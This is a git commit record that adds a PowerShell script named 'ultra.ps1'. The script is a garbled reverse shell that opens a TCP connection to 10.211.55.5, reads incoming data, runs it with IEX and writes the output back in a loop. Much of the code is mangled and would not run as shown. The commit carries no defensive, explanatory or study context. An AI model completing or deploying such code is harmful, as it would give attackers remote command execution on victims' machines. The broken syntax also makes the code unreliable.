7710a2e6fa99bb67d30104d70286f86da8c91382
bisoestate-bit <bisoestate@gmail.com>
2026-08-10 09:50:42 -0700

    Create ultra.ps1

---
+++ ultra.ps1
@@ -0,0 +1,9 @@
+
+$c0p = New-Rule 9qZnC7 -> P$`zr|BhC|
+Nstg*=$stream =$($Tcp Clint.)ip:$Port= '10.211.55.5';_x.$nYc = `$cl.GetSte,$Writer=; new-ob (`outstring $reader).S$trea nRd`.byte[409600]$Tid 
+
+While ($f = Ftrue {
+    $Cmd | sc(try {
+IEX ` $buf 
+           WRitE ($Resp + pS>'
+           ($FLUsh ) }.catch{ break } .$cp.Close())
